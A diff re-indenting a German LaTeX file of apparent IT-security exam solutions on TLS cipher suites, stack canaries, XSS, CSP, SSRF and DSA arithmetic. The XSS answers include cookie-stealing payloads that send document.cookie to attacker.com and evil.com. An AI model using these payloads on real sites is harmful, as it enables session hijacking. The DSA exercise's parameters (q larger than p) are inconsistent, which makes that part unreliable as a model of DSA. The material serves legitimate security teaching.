-                  \item \texttt{MD5} ist kollisionsanfällig und kryptografisch gebrochen.
-            \end{itemize}
+  \item[\textbf{a)}] \texttt{TLS\_RSA\_WITH\_RC4\_128\_MD5} \\
+        \textbf{Nein (Unsicher).}
+        \begin{itemize}
+          \item \texttt{RSA} (ohne DHE) bietet kein Forward Secrecy.
+          \item \texttt{RC4} ist ein gebrochener Stromalgorithmus mit statistischen Schwächen.
+          \item \texttt{MD5} ist kollisionsanfällig und kryptografisch gebrochen.
+        \end{itemize}
 
-      \item[\textbf{b)}] \texttt{TLS\_CHACHA20\_POLY1305\_SHA256} \\
-            \textbf{Ja (Sicher).}
-            \begin{itemize}
-                  \item Dies ist eine moderne AEAD-Suite (vergleichbar mit AES-GCM), die oft auf mobilen Geräten bevorzugt wird.
-            \end{itemize}
+  \item[\textbf{b)}] \texttt{TLS\_CHACHA20\_POLY1305\_SHA256} \\
+        \textbf{Ja (Sicher).}
+        \begin{itemize}
+          \item Dies ist eine moderne AEAD-Suite (vergleichbar mit AES-GCM), die oft auf mobilen Geräten bevorzugt wird.
+        \end{itemize}
 
-      \item[\textbf{c)}] \texttt{TLS\_ECDHE\_PSK\_WITH\_NULL\_SHA256} \\
-            \textbf{Nein (Unsicher).}
-            \begin{itemize}
-                  \item \texttt{NULL} bedeutet, dass \textbf{keine Verschlüsselung} der Nutzdaten stattfindet. Es wird nur Integrität (SHA256) und Authentifizierung geboten, aber keine Vertraulichkeit.
-            \end{itemize}
+  \item[\textbf{c)}] \texttt{TLS\_ECDHE\_PSK\_WITH\_NULL\_SHA256} \\
+        \textbf{Nein (Unsicher).}
+        \begin{itemize}
+          \item \texttt{NULL} bedeutet, dass \textbf{keine Verschlüsselung} der Nutzdaten stattfindet. Es wird nur Integrität (SHA256) und Authentifizierung geboten, aber keine Vertraulichkeit.
+        \end{itemize}
 
-      \item[\textbf{d)}] \texttt{TLS\_AES\_256\_GCM\_SHA384} \\
-            \textbf{Ja (Sicher).}
-            \begin{itemize}
-                  \item Dies ist eine Standard-Suite für TLS 1.3 und entspricht dem aktuellen Stand der Technik.
-            \end{itemize}
+  \item[\textbf{d)}] \texttt{TLS\_AES\_256\_GCM\_SHA384} \\
+        \textbf{Ja (Sicher).}
+        \begin{itemize}
+          \item Dies ist eine Standard-Suite für TLS 1.3 und entspricht dem aktuellen Stand der Technik.
+        \end{itemize}
 \end{enumerate}
 
 \section*{4. Software Security}
@@ -344,16 +344,16 @@ Stack-Kanaren (Stack Canaries) sind Schutzmechanismen, die vor Pufferüberläufe
 \textbf{Zweck:} \\
 Bevor die Funktion endet und zur aufrufenden Funktion zurückkehrt, prüft das Programm, ob der Wert des Kanarienvogels noch intakt ist.
 \begin{itemize}
-      \item Wenn ein Angreifer einen Pufferüberlauf ausnutzt, um die Rücksprungadresse zu überschreiben, muss er zwangsläufig auch den Kanarienvogel überschreiben.
-      \item Das System erkennt die Veränderung des Wertes, bricht die Programmausführung sofort ab und verhindert so, dass der manipulierte Rücksprung (z. B. zu Schadcode/Shellcode) ausgeführt wird.
+  \item Wenn ein Angreifer einen Pufferüberlauf ausnutzt, um die Rücksprungadresse zu überschreiben, muss er zwangsläufig auch den Kanarienvogel überschreiben.
+  \item Das System erkennt die Veränderung des Wertes, bricht die Programmausführung sofort ab und verhindert so, dass der manipulierte Rücksprung (z. B. zu Schadcode/Shellcode) ausgeführt wird.
 \end{itemize}
 
 \subsection*{2. CVE vs. CWE}
 Der Unterschied liegt in der Abstraktionsebene (Konkret vs. Abstrakt):
 
 \begin{itemize}
-      \item \textbf{CVE (Common Vulnerabilities and Exposures):} Bezieht sich auf eine \textit{konkrete} Instanz einer Sicherheitslücke in einem spezifischen Produkt (z. B. \texttt{CVE-2021-44228} für die Log4Shell-Lücke). Es ist quasi ein Katalog bekannter "`Unfälle"'.
-      \item \textbf{CWE (Common Weakness Enumeration):} Bezieht sich auf die \textit{Art} oder \textit{Kategorie} des Softwarefehlers, der zur Lücke führt (z. B. \texttt{CWE-78} für OS Command Injection). Es ist eine Taxonomie der Fehlerursachen.
+  \item \textbf{CVE (Common Vulnerabilities and Exposures):} Bezieht sich auf eine \textit{konkrete} Instanz einer Sicherheitslücke in einem spezifischen Produkt (z. B. \texttt{CVE-2021-44228} für die Log4Shell-Lücke). Es ist quasi ein Katalog bekannter "`Unfälle"'.
+  \item \textbf{CWE (Common Weakness Enumeration):} Bezieht sich auf die \textit{Art} oder \textit{Kategorie} des Softwarefehlers, der zur Lücke führt (z. B. \texttt{CWE-78} für OS Command Injection). Es ist eine Taxonomie der Fehlerursachen.
 \end{itemize}
 
 \subsection*{3. Off-by-One-Fehler}
@@ -404,55 +404,55 @@ printf("Willkommen %s\n", name);
 \section*{5. Web App Security}
 
 \begin{enumerate}
-      \item \textbf{Angriffsszenarien bei XSS (Cross-Site Scripting)} \\
-            Wenn ein Angreifer JavaScript im Browser des Opfers ausführen kann, stehen ihm unter anderem folgende vier Möglichkeiten zur Verfügung:
-            \begin{itemize}
-                  \item \textbf{Session Hijacking:} Der Angreifer liest das Session-Cookie über \texttt{document.cookie} aus und sendet es an seinen Server, um die Sitzung des Opfers zu übernehmen.
-                  \item \textbf{Phishing / Defacement:} Manipulation des DOM (Document Object Model), um gefälschte Login-Formulare anzuzeigen oder Inhalte zu verändern.
-                  \item \textbf{CSRF via XSS:} Ausführen von Aktionen im Namen des Nutzers (z.\,B. Passwort ändern, Käufe tätigen), indem HTTP-Requests im Hintergrund gesendet werden.
-                  \item \textbf{Browser Exploitation:} Ausnutzen von Schwachstellen im Browser oder in Plugins (Drive-by-Downloads) oder Scannen des internen Netzwerks (Intranet) über den Browser des Opfers.
-            \end{itemize}
+  \item \textbf{Angriffsszenarien bei XSS (Cross-Site Scripting)} \\
+        Wenn ein Angreifer JavaScript im Browser des Opfers ausführen kann, stehen ihm unter anderem folgende vier Möglichkeiten zur Verfügung:
+        \begin{itemize}
+          \item \textbf{Session Hijacking:} Der Angreifer liest das Session-Cookie über \texttt{document.cookie} aus und sendet es an seinen Server, um die Sitzung des Opfers zu übernehmen.
+          \item \textbf{Phishing / Defacement:} Manipulation des DOM (Document Object Model), um gefälschte Login-Formulare anzuzeigen oder Inhalte zu verändern.
+          \item \textbf{CSRF via XSS:} Ausführen von Aktionen im Namen des Nutzers (z.\,B. Passwort ändern, Käufe tätigen), indem HTTP-Requests im Hintergrund gesendet werden.
+          \item \textbf{Browser Exploitation:} Ausnutzen von Schwachstellen im Browser oder in Plugins (Drive-by-Downloads) oder Scannen des internen Netzwerks (Intranet) über den Browser des Opfers.
+        \end{itemize}
 
-      \item \textbf{OWASP Top 10 (Referenz 2021)} \\
-            Fünf zentrale Schwachstellen der aktuellen OWASP Top 10 sind:
-            \begin{enumerate}
-                  \item \textbf{Broken Access Control:} Fehlende serverseitige Durchsetzung von Zugriffsbeschränkungen (z.\,B. Zugriff auf fremde Nutzerdaten).
-                  \item \textbf{Cryptographic Failures:} Unsichere Speicherung (z.\,B. MD5) oder Übertragung (kein HTTPS) sensibler Daten.
-                  \item \textbf{Injection:} Einschleusen von Befehlen (SQL, NoSQL, OS Command) in Interpreter durch ungefilterte Nutzereingaben.
-                  \item \textbf{Insecure Design:} Strukturelle Sicherheitsmängel, die bereits in der Architekturphase entstehen (z.\,B. fehlende Ratenbegrenzung).
-                  \item \textbf{Security Misconfiguration:} Unsichere Standardeinstellungen, offene Cloud-Speicher oder zu detaillierte Fehlermeldungen.
-            \end{enumerate}
+  \item \textbf{OWASP Top 10 (Referenz 2021)} \\
+        Fünf zentrale Schwachstellen der aktuellen OWASP Top 10 sind:
+        \begin{enumerate}
+          \item \textbf{Broken Access Control:} Fehlende serverseitige Durchsetzung von Zugriffsbeschränkungen (z.\,B. Zugriff auf fremde Nutzerdaten).
+          \item \textbf{Cryptographic Failures:} Unsichere Speicherung (z.\,B. MD5) oder Übertragung (kein HTTPS) sensibler Daten.
+          \item \textbf{Injection:} Einschleusen von Befehlen (SQL, NoSQL, OS Command) in Interpreter durch ungefilterte Nutzereingaben.
+          \item \textbf{Insecure Design:} Strukturelle Sicherheitsmängel, die bereits in der Architekturphase entstehen (z.\,B. fehlende Ratenbegrenzung).
+          \item \textbf{Security Misconfiguration:} Unsichere Standardeinstellungen, offene Cloud-Speicher oder zu detaillierte Fehlermeldungen.
+        \end{enumerate}
 
-      \item \textbf{Stored XSS: Szenario und Payload} \\
-            \textbf{Erläuterung:} Bei Stored XSS wird der Schadcode dauerhaft in der Datenbank (z.\,B. in einem Kommentar) gespeichert. Wenn andere Benutzer den Kommentar aufrufen, liefert der Server das Skript aus, und der Browser führt es aus. \\
-            \textbf{Beispiel-Payload (JavaScript):}
-            \begin{lstlisting}[language=HTML]
+  \item \textbf{Stored XSS: Szenario und Payload} \\
+        \textbf{Erläuterung:} Bei Stored XSS wird der Schadcode dauerhaft in der Datenbank (z.\,B. in einem Kommentar) gespeichert. Wenn andere Benutzer den Kommentar aufrufen, liefert der Server das Skript aus, und der Browser führt es aus. \\
+        \textbf{Beispiel-Payload (JavaScript):}
+        \begin{lstlisting}[language=HTML]
 <script>
   // Sendet Cookies an den Angreifer
   new Image().src = "http://attacker.com/log?cookie=" + document.cookie;
 </script>
 \end{lstlisting}
 
-      \item \textbf{Reflected XSS: Angriffsvektor} \\
-            Da der URL-Parameter \texttt{q} ungefiltert ausgegeben wird:
-            \begin{itemize}
-                  \item \textbf{Vektor:}
-                        \texttt{https://shop.com/suche?q=<script>window.location='https://evil.com/?c='\%2Bdocument.cookie</script>}
-                  \item \textbf{Ablauf:} Das Opfer klickt auf den Link. Der Shop-Server spiegelt den Parameter \texttt{q} in die HTML-Antwort. Der Browser führt das Skript aus und leitet das Opfer inkl. Cookies an \texttt{evil.com} weiter.
-            \end{itemize}
+  \item \textbf{Reflected XSS: Angriffsvektor} \\
+        Da der URL-Parameter \texttt{q} ungefiltert ausgegeben wird:
+        \begin{itemize}
+          \item \textbf{Vektor:}
+                \texttt{https://shop.com/suche?q=<script>window.location='https://evil.com/?c='\%2Bdocument.cookie</script>}
+          \item \textbf{Ablauf:} Das Opfer klickt auf den Link. Der Shop-Server spiegelt den Parameter \texttt{q} in die HTML-Antwort. Der Browser führt das Skript aus und leitet das Opfer inkl. Cookies an \texttt{evil.com} weiter.
+        \end{itemize}
 
-      \item \textbf{Schutzmechanismus für externen Code} \\
-            Der Mechanismus heißt \textbf{Subresource Integrity (SRI)}. Dabei wird im \texttt{<script>}-Tag ein kryptographischer Hashwert der Datei angegeben. Stimmt dieser nicht mit der geladenen Datei überein, blockiert der Browser die Ausführung.
+  \item \textbf{Schutzmechanismus für externen Code} \\
+        Der Mechanismus heißt \textbf{Subresource Integrity (SRI)}. Dabei wird im \texttt{<script>}-Tag ein kryptographischer Hashwert der Datei angegeben. Stimmt dieser nicht mit der geladenen Datei überein, blockiert der Browser die Ausführung.
 
-      \item \textbf{Content Security Policy (CSP)} \\
-            Die Regel \texttt{script-src 'self'} erlaubt Skripte nur, wenn sie vom gleichen Ursprung (Origin) wie die Webseite geladen werden. Der Angriff \texttt{<script>alert('XSS')</script>} ist ein \textbf{Inline-Script}. Da Inline-Scripte standardmäßig von CSP blockiert werden (sofern nicht \texttt{'unsafe-inline'} erlaubt ist), wird der Code nicht ausgeführt.
+  \item \textbf{Content Security Policy (CSP)} \\
+        Die Regel \texttt{script-src 'self'} erlaubt Skripte nur, wenn sie vom gleichen Ursprung (Origin) wie die Webseite geladen werden. Der Angriff \texttt{<script>alert('XSS')</script>} ist ein \textbf{Inline-Script}. Da Inline-Scripte standardmäßig von CSP blockiert werden (sofern nicht \texttt{'unsafe-inline'} erlaubt ist), wird der Code nicht ausgeführt.
 
-      \item \textbf{HSTS (HTTP Strict Transport Security)} \\
-            \textbf{Ziel:} Erzwingen von verschlüsselten Verbindungen (HTTPS), um \textbf{SSL-Stripping} (Downgrade-Attacken) zu verhindern. \\
-            \textbf{Preload:} Der Parameter sorgt für die Aufnahme in die Preload-Liste der Browser-Hersteller. Damit ist die Seite bereits beim allerersten Aufruf geschützt, noch bevor der Header erstmals empfangen wurde.
+  \item \textbf{HSTS (HTTP Strict Transport Security)} \\
+        \textbf{Ziel:} Erzwingen von verschlüsselten Verbindungen (HTTPS), um \textbf{SSL-Stripping} (Downgrade-Attacken) zu verhindern. \\
+        \textbf{Preload:} Der Parameter sorgt für die Aufnahme in die Preload-Liste der Browser-Hersteller. Damit ist die Seite bereits beim allerersten Aufruf geschützt, noch bevor der Header erstmals empfangen wurde.
 
-      \item \textbf{Missbrauch von Datei-Uploads (SSRF)} \\
-            Dies ist eine \textbf{Server-Side Request Forgery (SSRF)}. Ein Angreifer gibt statt einer Bild-URL eine interne Adresse an (z.\,B. \texttt{http://localhost:8080} oder \texttt{http://192.168.0.1}). Der Server versucht, die Datei zu laden. Anhand der Fehlermeldungen oder Timeouts kann der Angreifer Ports scannen und interne Dienste identifizieren.
+  \item \textbf{Missbrauch von Datei-Uploads (SSRF)} \\
+        Dies ist eine \textbf{Server-Side Request Forgery (SSRF)}. Ein Angreifer gibt statt einer Bild-URL eine interne Adresse an (z.\,B. \texttt{http://localhost:8080} oder \texttt{http://192.168.0.1}). Der Server versucht, die Datei zu laden. Anhand der Fehlermeldungen oder Timeouts kann der Angreifer Ports scannen und interne Dienste identifizieren.
 \end{enumerate}
 
 \newpage
@@ -468,10 +468,10 @@ Nachrichtenhahs $H(m) = 5$, Zufallswert $k = 4$.
 \textbf{Schritt 1: Berechnung von $r$} \\
 Formel: $r = (g^k \pmod p) \pmod q$
 \begin{align*}
-      g^k \pmod p & = 4^4 \pmod{11}                                           \\
-      4^4         & = 256                                                     \\
-      256 \div 11 & = 23 \text{ Rest } 3 \quad (\text{da } 23 \cdot 11 = 253) \\
-      r           & = 3 \pmod{23} = \mathbf{3}
+  g^k \pmod p & = 4^4 \pmod{11}                                           \\
+  4^4         & = 256                                                     \\
+  256 \div 11 & = 23 \text{ Rest } 3 \quad (\text{da } 23 \cdot 11 = 253) \\
+  r           & = 3 \pmod{23} = \mathbf{3}
 \end{align*}
 
 \textbf{Schritt 2: Berechnung von $s$} \\
@@ -480,11 +480,11 @@ Zunächst das modulare Inverse von $k=4$ modulo $q=23$:
 Wir suchen $z$ mit $4 \cdot z \equiv 1 \pmod{23}$. \\
 Da $4 \cdot 6 = 24 \equiv 1 \pmod{23}$, ist $k^{-1} = 6$.
 \begin{align*}
-      s & = 6 \cdot (5 + 7 \cdot 3) \pmod{23}                  \\
-      s & = 6 \cdot (5 + 21) \pmod{23}                         \\
-      s & = 6 \cdot 26 \pmod{23}                               \\
-      s & = 6 \cdot 3 \pmod{23} \quad (\text{da } 26 \equiv 3) \\
-      s & = 18
+  s & = 6 \cdot (5 + 7 \cdot 3) \pmod{23}                  \\
+  s & = 6 \cdot (5 + 21) \pmod{23}                         \\
+  s & = 6 \cdot 26 \pmod{23}                               \\
+  s & = 6 \cdot 3 \pmod{23} \quad (\text{da } 26 \equiv 3) \\
+  s & = 18
 \end{align*}
 \textbf{Ergebnis:} Die Signatur ist $(r, s) = \mathbf{(3, 18)}$.
 
@@ -495,10 +495,10 @@ Wir prüfen, ob $r=4$ und $s=20$ gültig sind.
 \textbf{Schritt 1: Berechnung des Public Key $y$} \\
 Formel: $y = g^x \pmod p$
 \begin{align*}
-      y   & = 4^7 \pmod{11}                                                                     \\
-      4^2 & = 16 \equiv 5 \pmod{11}                                                             \\
-      4^4 & = 256 \equiv 3 \pmod{11}                                                            \\
-      4^7 & = 4^4 \cdot 4^2 \cdot 4^1 \equiv 3 \cdot 5 \cdot 4 = 60 \equiv \mathbf{5} \pmod{11}
+  y   & = 4^7 \pmod{11}                                                                     \\
+  4^2 & = 16 \equiv 5 \pmod{11}                                                             \\
+  4^4 & = 256 \equiv 3 \pmod{11}                                                            \\
+  4^7 & = 4^4 \cdot 4^2 \cdot 4^1 \equiv 3 \cdot 5 \cdot 4 = 60 \equiv \mathbf{5} \pmod{11}
 \end{align*}
 Alices Public Key ist $y=5$.
 
@@ -510,24 +510,24 @@ $\Rightarrow w = 15$.
 
 Berechnung der Hilfswerte $u_1$ und $u_2$:
 \begin{align*}
-      u_1 & = (H(m) \cdot w) \pmod q = (10 \cdot 15) \pmod{23} = 150 \equiv 12 \pmod{23} \\
-      u_2 & = (r \cdot w) \pmod q = (4 \cdot 15) \pmod{23} = 60 \equiv 14 \pmod{23}
+  u_1 & = (H(m) \cdot w) \pmod q = (10 \cdot 15) \pmod{23} = 150 \equiv 12 \pmod{23} \\
+  u_2 & = (r \cdot w) \pmod q = (4 \cdot 15) \pmod{23} = 60 \equiv 14 \pmod{23}
 \end{align*}
 
 Berechnung von $v$:
 Formel: $v = (g^{u_1} \cdot y^{u_2} \pmod p) \pmod q$
 \begin{align*}
-      v & = (4^{12} \cdot 5^{14} \pmod{11}) \pmod{23}
+  v & = (4^{12} \cdot 5^{14} \pmod{11}) \pmod{23}
 \end{align*}
 Mit dem kleinen Satz von Fermat ($a^{10} \equiv 1 \pmod{11}$):
 \begin{itemize}
-      \item $4^{12} = 4^{10} \cdot 4^2 \equiv 1 \cdot 16 \equiv 5 \pmod{11}$
-      \item $5^{14} = 5^{10} \cdot 5^4 \equiv 1 \cdot 625 \equiv 1 \cdot 9 \pmod{11}$ (da $5^2=25\equiv3, 3^2=9$)
+  \item $4^{12} = 4^{10} \cdot 4^2 \equiv 1 \cdot 16 \equiv 5 \pmod{11}$
+  \item $5^{14} = 5^{10} \cdot 5^4 \equiv 1 \cdot 625 \equiv 1 \cdot 9 \pmod{11}$ (da $5^2=25\equiv3, 3^2=9$)
 \end{itemize}
 Zusammenfügen:
 \begin{align*}
-      v_{\text{inner}} & = 5 \cdot 9 = 45 \equiv 1 \pmod{11} \\
-      v                & = 1 \pmod{23} = 1
+  v_{\text{inner}} & = 5 \cdot 9 = 45 \equiv 1 \pmod{11} \\
+  v                & = 1 \pmod{23} = 1
 \end{align*}
 \textbf{Ergebnis:} Da $v = 1$ und $r = 4$ (aus der Signatur) nicht übereinstimmen ($v \neq r$), ist die Signatur \textbf{ungültig}.
 
